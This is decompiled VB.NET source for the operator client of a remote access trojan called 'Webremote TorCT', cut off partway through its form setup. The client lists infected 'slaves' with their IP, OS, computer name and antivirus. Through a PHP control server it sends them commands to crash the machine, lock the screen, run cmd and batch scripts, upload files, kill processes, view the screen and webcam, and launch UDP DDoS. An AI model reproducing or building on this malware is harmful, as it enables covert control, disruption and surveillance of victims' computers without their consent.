Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Webremote_TorCT_5_1.My
Imports Webremote_TorCT_5_1.My.Resources

Namespace Webremote_TorCT_5_1
    <DesignerGenerated> _
    Public Class Client
        Inherits Form
        ' Methods
        Public Sub New()
            AddHandler MyBase.FormClosing, New FormClosingEventHandler(AddressOf Me.Client_FormClosing)
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.Client_Load)
            Dim list As List(Of WeakReference) = Client.__ENCList
            SyncLock list
                Client.__ENCList.Add(New WeakReference(Me))
            End SyncLock
            Me.a = Nothing
            Me.b = Nothing
            Me.r = Nothing
            Me.L = Nothing
            Me.HostName = ""
            Me.Strvictem = "&SpecialUser=False"
            Me.WitchViewSW = Conversions.ToInteger("0")
            Me.CS = Nothing
            Me.RefreshSlaves = 0
            Me.phpver = 0
            Me.SOstring = ""
            Me.InputVlaue = ""
            Me.CheckSlaves = New WebClient
            Me.CheckServer = New WebClient
            Me.SendCommand = New WebClient
            Me.ConectTorCT = New WebClient
            Me.InitializeComponent
        End Sub

        Private Sub BlackScreenToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=BlackScreen747" & Me.Strvictem.ToString))
                Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("ERROR: Could't send action", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub BlueScreenToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=BlueScreen747" & Me.Strvictem.ToString))
                Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("ERROR: Could't send action", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub CheckOnline()
            Try 
                Me.ListView1.Items.Clear
                Me.a = Me.CheckSlaves.DownloadString((Me.HostName.ToString & "/Slaves.txt"))
                Me.SOstring = Conversions.ToString(CInt((Me.a.Split(New Char() { "+"c }).Length - 1)))
                Me.SOnline.Text = (Me.SOstring.ToString & " : Online Slaves")
                Me.b = Me.a.Split(New Char() { "+"c })
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("ERROR : Connecting server to Get Slaves", MsgBoxStyle.Critical, "ERROR!")
                ProjectData.ClearProjectError
            End Try
            Try 
                Dim num3 As Long = 0
                Dim num5 As Long = Information.UBound(Me.b, 1)
                num3 = 0
                Do While (num3 <= num5)
                    Dim num4 As Integer = Conversions.ToInteger(num3.ToString)
                    Me.r = Strings.Split(Me.b(CInt(num3)).ToString, "|", 7, CompareMethod.Binary)
                    If Me.r(1).Contains(".") Then
                        Me.ListView1.Items.Add("")
                        Me.ListView1.Items.Item(num4).SubItems.Add(Me.r(0))
                        If (Me.r(1) = "") Then
                            Me.ListView1.Items.Item(num4).SubItems.Add("ERROR")
                        Else
                            Me.ListView1.Items.Item(num4).SubItems.Add(Me.r(1))
                        End If
                        If (Me.r(2) = "") Then
                            Me.ListView1.Items.Item(num4).SubItems.Add("ERROR")
                        Else
                            Me.ListView1.Items.Item(num4).SubItems.Add(Me.r(2))
                        End If
                        If (Me.r(3) = "") Then
                            Me.ListView1.Items.Item(num4).SubItems.Add("ERROR")
                        Else
                            Me.ListView1.Items.Item(num4).SubItems.Add(Me.r(3))
                        End If
                        If (Me.r(4) = "") Then
                            Me.ListView1.Items.Item(num4).SubItems.Add("ERROR")
                        Else
                            Me.ListView1.Items.Item(num4).SubItems.Add(Me.r(4))
                        End If
                        If (Me.r(5) = "") Then
                            Me.ListView1.Items.Item(num4).SubItems.Add("ERROR")
                        Else
                            Me.ListView1.Items.Item(num4).SubItems.Add((Me.r(5) & " GB"))
                        End If
                        If (Me.r(6) = "") Then
                            Me.ListView1.Items.Item(num4).SubItems.Add("ERROR")
                        Else
                            Me.ListView1.Items.Item(num4).SubItems.Add(Me.r(6))
                        End If
                    End If
                    num3 = (num3 + 1)
                Loop
            Catch exception4 As Exception
                ProjectData.SetProjectError(exception4)
                Dim exception2 As Exception = exception4
                ProjectData.ClearProjectError
            End Try
            Dim list As New ImageList
            Me.ListView1.BeginUpdate
            Dim num6 As Integer = (Me.ListView1.Items.Count - 1)
            Dim i As Integer = 0
            Do While (i <= num6)
                Me.L = Strings.Split(Me.ListView1.Items.Item(i).SubItems.Item(1).Text, "]", 2, CompareMethod.Binary)
                Dim expression As String = Strings.Replace(Me.L(1).ToString, " - ", "", 1, -1, CompareMethod.Binary).ToString
                If (expression = "") Then
                    expression = "Unknown"
                End If
                expression = Strings.Replace(expression, " ", "_", 1, -1, CompareMethod.Binary).ToString
                Try 
                    NewLateBinding.LateCall(list.Images, Nothing, "Add", New Object() { RuntimeHelpers.GetObjectValue(Resources.ResourceManager.GetObject(expression)) }, Nothing, Nothing, Nothing, True)
                Catch exception5 As Exception
                    ProjectData.SetProjectError(exception5)
                    Dim exception3 As Exception = exception5
                    list.Images.Add(Resources.Unknown)
                    ProjectData.ClearProjectError
                End Try
                Me.ListView1.SmallImageList = list
                Me.ListView1.Items.Item(i).ImageIndex = i
                i += 1
            Loop
            Me.ListView1.EndUpdate
            Me.ListView1.Refresh
        End Sub

        Public Sub CheckServerConection()
            Try 
                If (Me.CheckServer.DownloadString((Me.HostName.ToString & "/ConectedTrue.php")) = "1") Then
                    Me.Conected.Text = "Connected : True"
                    Me.Conected.ForeColor = Color.Green
                    Me.HostText.Text = ("Host : " & Me.HostName.ToString)
                Else
                    Me.Conected.Text = "Connected : False"
                    Me.Conected.ForeColor = Color.Red
                    Me.HostText.Text = "Host : Not Found"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Me.Conected.Text = "Connected : False"
                Me.HostText.Text = "Host : Not Found"
                Me.Conected.ForeColor = Color.Red
                Interaction.MsgBox("ERROR :" & ChrW(13) & ChrW(10) & "Can't connect to host Or Can't find it" & ChrW(13) & ChrW(10) & "Please check your internet connection" & ChrW(13) & ChrW(10) & "Or check your host!", MsgBoxStyle.Critical, "ERROR!")
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub Client_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs)
            If ((Me.HostName.ToString <> "") AndAlso Not ((Me.Conected.Text = "Connected : False") Or (Me.Conected.Text = "Connected : ???"))) Then
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=" & Me.Strvictem.ToString))
            End If
            MyProject.Forms.Loding_Screen.Close
        End Sub

        Private Sub Client_Load(ByVal sender As Object, ByVal e As EventArgs)
            Dim size As New Size(0, &H24)
            Me.Panel1.Size = size
            size = New Size(0, 0)
            Me.Panel6.Size = size
            Try 
                Dim reader As TextReader = New StreamReader((Application.StartupPath & "\ClientSafe.txt"))
                Me.CS = reader.ReadToEnd
                reader.Close
                Dim reader2 As TextReader = New StreamReader((Application.StartupPath & "\HostLink.txt"))
                Me.HostName = reader2.ReadToEnd
                If Me.HostName.ToString.Contains("http://") Then
                    reader2.Close
                    Me.CheckServerConection
                    Me.CheckOnline
                Else
                    reader2.Close
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                File.Create((Application.StartupPath & "\HostLink.txt"))
                Interaction.MsgBox(exception.ToString, MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
            Try 
                Me.Label3.Text = ("News : " & Me.ConectTorCT.DownloadString("http://www.torct.eu/NewsTorCT/news.txt"))
            Catch exception4 As Exception
                ProjectData.SetProjectError(exception4)
                Dim exception2 As Exception = exception4
                Me.Label3.Text = "News : Not fount"
                ProjectData.ClearProjectError
            End Try
            Try 
                Me.phpv.Text = ("PHP Version : " & Me.ConectTorCT.DownloadString((Me.HostName.ToString & "/php.txt")))
            Catch exception5 As Exception
                ProjectData.SetProjectError(exception5)
                Dim exception3 As Exception = exception5
                Me.phpv.Text = "PHP Version : not fount"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub ClientPasswordhostToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            MyProject.Forms.Clientpasswordwindows.Show
        End Sub

        Private Sub ClientSettingsToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            MyProject.Forms.SetupClient.Show
        End Sub

        Private Sub ColoredScreenToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=ColorScreen747" & Me.Strvictem.ToString))
                Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("ERROR: Could't send action", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub Conected_Click(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub CrashComputerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=CrasherPC747" & Me.Strvictem.ToString))
                Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("ERROR: Could't send action", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub CreditsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Interaction.MsgBox("Credit list : " & ChrW(13) & ChrW(10) & "Shawn O'Rion (Creator and owner)" & ChrW(13) & ChrW(10) & "gosquared.com (Icons)" & ChrW(13) & ChrW(10) & "DEEFS (Style Online Panel)", MsgBoxStyle.ApplicationModal, Nothing)
        End Sub

        Private Sub DeliteAllToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            MyProject.Forms.UploadFileTo.Show
            MyProject.Forms.UploadFileTo.Upateserver = 1
        End Sub

        Private Sub DeliteSlaveToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.InputVlaue = Interaction.InputBox("Are u sure you want to delite your Slave(s)" & ChrW(13) & ChrW(10) & "Typ 'YES' If you are sure!", "Website", "NO", -1, -1)
            If (Me.InputVlaue = "YES") Then
                Try 
                    Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=DeliteMeBatch747" & Me.Strvictem.ToString))
                    Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    Interaction.MsgBox("Somthing is wrong", MsgBoxStyle.ApplicationModal, Nothing)
                    ProjectData.ClearProjectError
                End Try
            Else
                Interaction.MsgBox("We haven't delited your slaves!", MsgBoxStyle.ApplicationModal, Nothing)
            End If
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.components Is Nothing)) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Private Sub DonatePaypallToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Process.Start("https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=GGXTX3TYX4QKJ")
        End Sub

        Private Sub GetActiveWindowToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If Me.SelectedV.Text.Contains("All Slaves") Then
                Interaction.MsgBox("Please Select only 1 victem!", MsgBoxStyle.ApplicationModal, Nothing)
            Else
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=GetActiveWindow747" & Me.Strvictem.ToString))
                MyProject.Forms.getactivewindow.Show
            End If
        End Sub

        Public Sub getland()
        End Sub

        Private Sub GetProceToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If Me.SelectedV.Text.Contains("All Slaves") Then
                Interaction.MsgBox("Please Select only 1 victem!", MsgBoxStyle.ApplicationModal, Nothing)
            Else
                MyProject.Forms.ProcessView.Show
            End If
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.components = New Container
            Dim manager As New ComponentResourceManager(GetType(Client))
            Me.ListView1 = New ListView
            Me.ColumnHeader1 = New ColumnHeader
            Me.ColumnHeader2 = New ColumnHeader
            Me.ColumnHeader3 = New ColumnHeader
            Me.ColumnHeader4 = New ColumnHeader
            Me.ColumnHeader5 = New ColumnHeader
            Me.ColumnHeader6 = New ColumnHeader
            Me.ColumnHeader7 = New ColumnHeader
            Me.ColumnHeader8 = New ColumnHeader
            Me.ContextMenuStrip1 = New ContextMenuStrip(Me.components)
            Me.ScreenToolStripMenuItem = New ToolStripMenuItem
            Me.BlackScreenToolStripMenuItem = New ToolStripMenuItem
            Me.BlueScreenToolStripMenuItem = New ToolStripMenuItem
            Me.ColoredScreenToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripSeparator1 = New ToolStripSeparator
            Me.UnclosebleBlackScreenToolStripMenuItem = New ToolStripMenuItem
            Me.UnclosebleBlueScreenToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripSeparator2 = New ToolStripSeparator
            Me.VieuwScreenToolStripMenuItem = New ToolStripMenuItem
            Me.FilesToolStripMenuItem = New ToolStripMenuItem
            Me.ViewSlaveFilesToolStripMenuItem = New ToolStripMenuItem
            Me.UploadFileToSlaveToolStripMenuItem = New ToolStripMenuItem
            Me.ProcessViewerToolStripMenuItem = New ToolStripMenuItem
            Me.KillProcessToolStripMenuItem1 = New ToolStripMenuItem
            Me.RunThingsToolStripMenuItem = New ToolStripMenuItem
            Me.RunCmdToolStripMenuItem = New ToolStripMenuItem
            Me.StartWebsiteToolStripMenuItem = New ToolStripMenuItem
            Me.OpenNotepadToolStripMenuItem = New ToolStripMenuItem
            Me.RunBatchScriptCMDToolStripMenuItem = New ToolStripMenuItem
            Me.OpenCDDToolStripMenuItem = New ToolStripMenuItem
            Me.ComputerManegerToolStripMenuItem = New ToolStripMenuItem
            Me.ShutdownComputerToolStripMenuItem = New ToolStripMenuItem
            Me.RestartComputerToolStripMenuItem = New ToolStripMenuItem
            Me.SleepToolStripMenuItem = New ToolStripMenuItem
            Me.WakeToolStripMenuItem = New ToolStripMenuItem
            Me.GetProceToolStripMenuItem = New ToolStripMenuItem
            Me.KillProcessToolStripMenuItem = New ToolStripMenuItem
            Me.FunThingsToolStripMenuItem = New ToolStripMenuItem
            Me.CrashComputerToolStripMenuItem = New ToolStripMenuItem
            Me.TalkComputerToolStripMenuItem = New ToolStripMenuItem
            Me.MsgboxToolStripMenuItem = New ToolStripMenuItem
            Me.OpenChatToolStripMenuItem = New ToolStripMenuItem
            Me.ShowImageToolStripMenuItem = New ToolStripMenuItem
            Me.DdoSToolStripMenuItem = New ToolStripMenuItem
            Me.UDPToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripSeparator3 = New ToolStripSeparator
            Me.DeliteSlaveToolStripMenuItem = New ToolStripMenuItem
            Me.VieuwWebcamToolStripMenuItem = New ToolStripMenuItem
            Me.Panel1 = New Panel
            Me.Panel2 = New Panel
            Me.phpv = New Label
            Me.Label3 = New Label
            Me.SelectedV = New Label
            Me.HostText = New Label
            Me.Label2 = New Label
            Me.Panel3 = New Panel
            Me.SOnline = New Label
            Me.Panel5 = New Panel
            Me.Label1 = New Label
            Me.Conected = New Label
            Me.Panel4 = New Panel
            Me.PictureBox1 = New PictureBox
            Me.ExtrainfoLabel = New Label
            Me.MenuStrip1 = New MenuStrip
            Me.ClientSettingsToolStripMenuItem = New ToolStripMenuItem
            Me.ClientSettingsToolStripMenuItem1 = New ToolStripMenuItem
            Me.RestartClientToolStripMenuItem = New ToolStripMenuItem
            Me.ClientPasswordhostToolStripMenuItem = New ToolStripMenuItem
            Me.ShowClientLogsToolStripMenuItem = New ToolStripMenuItem
            Me.ServerSettingsToolStripMenuItem = New ToolStripMenuItem
            Me.UpdToolStripMenuItem = New ToolStripMenuItem
            Me.SlavesToolStripMenuItem = New ToolStripMenuItem
            Me.RefreshSlavesToolStripMenuItem1 = New ToolStripMenuItem
            Me.DeliteAllToolStripMenuItem = New ToolStripMenuItem
            Me.SelectAllSlavesToolStripMenuItem = New ToolStripMenuItem
            Me.HelpTorCTToolStripMenuItem = New ToolStripMenuItem
            Me.DonatePaypallToolStripMenuItem = New ToolStripMenuItem
            Me.OpenAdflyLinksGoogleToolStripMenuItem = New ToolStripMenuItem
            Me.OpenOtherPPCToolStripMenuItem = New ToolStripMenuItem
            Me.OpenAdflyToolStripMenuItem = New ToolStripMenuItem
            Me.OtherToolStripMenuItem = New ToolStripMenuItem
            Me.TutorialsToolStripMenuItem = New ToolStripMenuItem
            Me.CreditsToolStripMenuItem = New ToolStripMenuItem
            Me.Timer2 = New Timer(Me.components)
            Me.Timer1 = New Timer(Me.components)
            Me.ImageList1 = New ImageList(Me.components)
            Me.Panel6 = New Panel
            Me.RichTextBox1 = New RichTextBox
            Me.Timer3 = New Timer(Me.components)
            Me.ToolStripSeparator4 = New ToolStripSeparator
            Me.GetActiveWindowToolStripMenuItem = New ToolStripMenuItem
            Me.ContextMenuStrip1.SuspendLayout
            Me.Panel1.SuspendLayout
            Me.Panel2.SuspendLayout
            Me.Panel3.SuspendLayout
            Me.Panel4.SuspendLayout
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            Me.MenuStrip1.SuspendLayout
            Me.Panel6.SuspendLayout
            Me.SuspendLayout
            Me.ListView1.Columns.AddRange(New ColumnHeader() { Me.ColumnHeader1, Me.ColumnHeader2, Me.ColumnHeader3, Me.ColumnHeader4, Me.ColumnHeader5, Me.ColumnHeader6, Me.ColumnHeader7, Me.ColumnHeader8 })
            Me.ListView1.ContextMenuStrip = Me.ContextMenuStrip1
            Me.ListView1.Dock = DockStyle.Fill
            Me.ListView1.FullRowSelect = True
            Me.ListView1.GridLines = True
            Dim point As New Point(0, &H1C)
            Me.ListView1.Location = point
            Me.ListView1.Name = "ListView1"
            Dim size As New Size(&H350, &HF5)
            Me.ListView1.Size = size
            Me.ListView1.TabIndex = &H1A
            Me.ListView1.UseCompatibleStateImageBehavior = False
            Me.ListView1.View = View.Details
            Me.ColumnHeader1.Text = "Flag"
            Me.ColumnHeader1.Width = &H22
            Me.ColumnHeader2.Text = "Country"
            Me.ColumnHeader2.Width = &H6A
            Me.ColumnHeader3.Text = "IP"
            Me.ColumnHeader3.Width = &H6F
            Me.ColumnHeader4.Text = "OS"
            Me.ColumnHeader4.Width = &H9B
            Me.ColumnHeader5.Text = "Computer Name"
            Me.ColumnHeader5.Width = 130
            Me.ColumnHeader6.Text = "Server Name"
            Me.ColumnHeader6.Width = &HAB
            Me.ColumnHeader7.Text = "RAM"
            Me.ColumnHeader7.Width = &H3F
            Me.ColumnHeader8.Text = "AntiVirus"
            Me.ColumnHeader8.Width = &H83
            size = New Size(20, 20)
            Me.ContextMenuStrip1.ImageScalingSize = size
            Me.ContextMenuStrip1.Items.AddRange(New ToolStripItem() { Me.ScreenToolStripMenuItem, Me.FilesToolStripMenuItem, Me.RunThingsToolStripMenuItem, Me.ComputerManegerToolStripMenuItem, Me.FunThingsToolStripMenuItem, Me.DdoSToolStripMenuItem, Me.ToolStripSeparator3, Me.DeliteSlaveToolStripMenuItem, Me.VieuwWebcamToolStripMenuItem })
            Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
            size = New Size(&HB7, 240)
            Me.ContextMenuStrip1.Size = size
            Me.ScreenToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.BlackScreenToolStripMenuItem, Me.BlueScreenToolStripMenuItem, Me.ColoredScreenToolStripMenuItem, Me.ToolStripSeparator1, Me.UnclosebleBlackScreenToolStripMenuItem, Me.UnclosebleBlueScreenToolStripMenuItem, Me.ToolStripSeparator2, Me.VieuwScreenToolStripMenuItem, Me.ToolStripSeparator4, Me.GetActiveWindowToolStripMenuItem })
            Me.ScreenToolStripMenuItem.Image = DirectCast(manager.GetObject("ScreenToolStripMenuItem.Image"), Image)
            Me.ScreenToolStripMenuItem.Name = "ScreenToolStripMenuItem"
            size = New Size(&HB6, &H1A)
            Me.ScreenToolStripMenuItem.Size = size
            Me.ScreenToolStripMenuItem.Text = "Screen"
            Me.BlackScreenToolStripMenuItem.Image = DirectCast(manager.GetObject("BlackScreenToolStripMenuItem.Image"), Image)
            Me.BlackScreenToolStripMenuItem.Name = "BlackScreenToolStripMenuItem"
            size = New Size(&HCD, &H1A)
            Me.BlackScreenToolStripMenuItem.Size = size
            Me.BlackScreenToolStripMenuItem.Text = "Black Screen"
            Me.BlueScreenToolStripMenuItem.Image = DirectCast(manager.GetObject("BlueScreenToolStripMenuItem.Image"), Image)
            Me.BlueScreenToolStripMenuItem.Name = "BlueScreenToolStripMenuItem"
            size = New Size(&HCD, &H1A)
            Me.BlueScreenToolStripMenuItem.Size = size
            Me.BlueScreenToolStripMenuItem.Text = "Blue Screen"
            Me.ColoredScreenToolStripMenuItem.Image = DirectCast(manager.GetObject("ColoredScreenToolStripMenuItem.Image"), Image)
            Me.ColoredScreenToolStripMenuItem.Name = "ColoredScreenToolStripMenuItem"
            size = New Size(&HCD, &H1A)
            Me.ColoredScreenToolStripMenuItem.Size = size
            Me.ColoredScreenToolStripMenuItem.Text = "Colored Screen"
            Me.ToolStripSeparator1.Name = "ToolStripSeparator1"
            size = New Size(&HCA, 6)
            Me.ToolStripSeparator1.Size = size
            Me.UnclosebleBlackScreenToolStripMenuItem.Image = DirectCast(manager.GetObject("UnclosebleBlackScreenToolStripMenuItem.Image"), Image)
            Me.UnclosebleBlackScreenToolStripMenuItem.Name = "UnclosebleBlackScreenToolStripMenuItem"
            size = New Size(&HCD, &H1A)
            Me.UnclosebleBlackScreenToolStripMenuItem.Size = size
            Me.UnclosebleBlackScreenToolStripMenuItem.Text = "Uncloseble Black Screen"
            Me.UnclosebleBlueScreenToolStripMenuItem.Image = DirectCast(manager.GetObject("UnclosebleBlueScreenToolStripMenuItem.Image"), Image)
            Me.UnclosebleBlueScreenToolStripMenuItem.Name = "UnclosebleBlueScreenToolStripMenuItem"
            size = New Size(&HCD, &H1A)
            Me.UnclosebleBlueScreenToolStripMenuItem.Size = size
            Me.UnclosebleBlueScreenToolStripMenuItem.Text = "Uncloseble Blue Screen"
            Me.ToolStripSeparator2.Name = "ToolStripSeparator2"
            size = New Size(&HCA, 6)
            Me.ToolStripSeparator2.Size = size
            Me.VieuwScreenToolStripMenuItem.Image = DirectCast(manager.GetObject("VieuwScreenToolStripMenuItem.Image"), Image)
            Me.VieuwScreenToolStripMenuItem.Name = "VieuwScreenToolStripMenuItem"
            size = New Size(&HCD, &H1A)
            Me.VieuwScreenToolStripMenuItem.Size = size
            Me.VieuwScreenToolStripMenuItem.Text = "View Screen"
            Me.FilesToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ViewSlaveFilesToolStripMenuItem, Me.UploadFileToSlaveToolStripMenuItem, Me.ProcessViewerToolStripMenuItem, Me.KillProcessToolStripMenuItem1 })
            Me.FilesToolStripMenuItem.Image = DirectCast(manager.GetObject("FilesToolStripMenuItem.Image"), Image)
            Me.FilesToolStripMenuItem.Name = "FilesToolStripMenuItem"
            size = New Size(&HB6, &H1A)
            Me.FilesToolStripMenuItem.Size = size
            Me.FilesToolStripMenuItem.Text = "Files"
            Me.ViewSlaveFilesToolStripMenuItem.Image = DirectCast(manager.GetObject("ViewSlaveFilesToolStripMenuItem.Image"), Image)
            Me.ViewSlaveFilesToolStripMenuItem.Name = "ViewSlaveFilesToolStripMenuItem"
            size = New Size(180, &H16)
            Me.ViewSlaveFilesToolStripMenuItem.Size = size
            Me.ViewSlaveFilesToolStripMenuItem.Text = "View Slave Files"
            Me.UploadFileToSlaveToolStripMenuItem.Image = DirectCast(manager.GetObject("UploadFileToSlaveToolStripMenuItem.Image"), Image)
            Me.UploadFileToSlaveToolStripMenuItem.Name = "UploadFileToSlaveToolStripMenuItem"
            size = New Size(180, &H16)
            Me.UploadFileToSlaveToolStripMenuItem.Size = size
            Me.UploadFileToSlaveToolStripMenuItem.Text = "Upload File To Slave"
            Me.ProcessViewerToolStripMenuItem.Image = DirectCast(manager.GetObject("ProcessViewerToolStripMenuItem.Image"), Image)
            Me.ProcessViewerToolStripMenuItem.Name = "ProcessViewerToolStripMenuItem"
            size = New Size(180, &H16)
            Me.ProcessViewerToolStripMenuItem.Size = size
            Me.ProcessViewerToolStripMenuItem.Text = "Process Viewer"
            Me.KillProcessToolStripMenuItem1.Image = DirectCast(manager.GetObject("KillProcessToolStripMenuItem1.Image"), Image)
            Me.KillProcessToolStripMenuItem1.Name = "KillProcessToolStripMenuItem1"
            size = New Size(180, &H16)
            Me.KillProcessToolStripMenuItem1.Size = size
            Me.KillProcessToolStripMenuItem1.Text = "Kill Process"
            Me.RunThingsToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.RunCmdToolStripMenuItem, Me.StartWebsiteToolStripMenuItem, Me.OpenNotepadToolStripMenuItem, Me.RunBatchScriptCMDToolStripMenuItem, Me.OpenCDDToolStripMenuItem })
            Me.RunThingsToolStripMenuItem.Image = DirectCast(manager.GetObject("RunThingsToolStripMenuItem.Image"), Image)
            Me.RunThingsToolStripMenuItem.Name = "RunThingsToolStripMenuItem"
            size = New Size(&HB6, &H1A)
            Me.RunThingsToolStripMenuItem.Size = size
            Me.RunThingsToolStripMenuItem.Text = "Run Things"
            Me.RunCmdToolStripMenuItem.Image = DirectCast(manager.GetObject("RunCmdToolStripMenuItem.Image"), Image)
            Me.RunCmdToolStripMenuItem.Name = "RunCmdToolStripMenuItem"
            size = New Size(&HC7, &H16)
            Me.RunCmdToolStripMenuItem.Size = size
            Me.RunCmdToolStripMenuItem.Text = "Run Cmd"
            Me.StartWebsiteToolStripMenuItem.Image = DirectCast(manager.GetObject("StartWebsiteToolStripMenuItem.Image"), Image)
            Me.StartWebsiteToolStripMenuItem.Name = "StartWebsiteToolStripMenuItem"
            size = New Size(&HC7, &H16)
            Me.StartWebsiteToolStripMenuItem.Size = size
            Me.StartWebsiteToolStripMenuItem.Text = "Start Website"
            Me.OpenNotepadToolStripMenuItem.Image = DirectCast(manager.GetObject("OpenNotepadToolStripMenuItem.Image"), Image)
            Me.OpenNotepadToolStripMenuItem.Name = "OpenNotepadToolStripMenuItem"
            size = New Size(&HC7, &H16)
            Me.OpenNotepadToolStripMenuItem.Size = size
            Me.OpenNotepadToolStripMenuItem.Text = "Open Notepad"
            Me.RunBatchScriptCMDToolStripMenuItem.Image = DirectCast(manager.GetObject("RunBatchScriptCMDToolStripMenuItem.Image"), Image)
            Me.RunBatchScriptCMDToolStripMenuItem.Name = "RunBatchScriptCMDToolStripMenuItem"
            size = New Size(&HC7, &H16)
            Me.RunBatchScriptCMDToolStripMenuItem.Size = size
            Me.RunBatchScriptCMDToolStripMenuItem.Text = "Run Batch Script (CMD)"
            Me.OpenCDDToolStripMenuItem.Image = DirectCast(manager.GetObject("OpenCDDToolStripMenuItem.Image"), Image)
            Me.OpenCDDToolStripMenuItem.Name = "OpenCDDToolStripMenuItem"
            size = New Size(&HC7, &H16)
            Me.OpenCDDToolStripMenuItem.Size = size
            Me.OpenCDDToolStripMenuItem.Text = "Open CD (D:/)"
            Me.ComputerManegerToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ShutdownComputerToolStripMenuItem, Me.RestartComputerToolStripMenuItem, Me.SleepToolStripMenuItem, Me.WakeToolStripMenuItem, Me.GetProceToolStripMenuItem, Me.KillProcessToolStripMenuItem })
            Me.ComputerManegerToolStripMenuItem.Image = DirectCast(manager.GetObject("ComputerManegerToolStripMenuItem.Image"), Image)
            Me.ComputerManegerToolStripMenuItem.Name = "ComputerManegerToolStripMenuItem"
            size = New Size(&HB6, &H1A)
            Me.ComputerManegerToolStripMenuItem.Size = size
            Me.ComputerManegerToolStripMenuItem.Text = "Computer Maneger"
            Me.ShutdownComputerToolStripMenuItem.Image = DirectCast(manager.GetObject("ShutdownComputerToolStripMenuItem.Image"), Image)
            Me.ShutdownComputerToolStripMenuItem.Name = "ShutdownComputerToolStripMenuItem"
            size = New Size(&HB9, &H16)
            Me.ShutdownComputerToolStripMenuItem.Size = size
            Me.ShutdownComputerToolStripMenuItem.Text = "Shutdown Computer"
            Me.RestartComputerToolStripMenuItem.Image = DirectCast(manager.GetObject("RestartComputerToolStripMenuItem.Image"), Image)
            Me.RestartComputerToolStripMenuItem.Name = "RestartComputerToolStripMenuItem"
            size = New Size(&HB9, &H16)
            Me.RestartComputerToolStripMenuItem.Size = size
            Me.RestartComputerToolStripMenuItem.Text = "Restart Computer"
            Me.SleepToolStripMenuItem.Image = DirectCast(manager.GetObject("SleepToolStripMenuItem.Image"), Image)
            Me.SleepToolStripMenuItem.Name = "SleepToolStripMenuItem"
            size = New Size(&HB9, &H16)
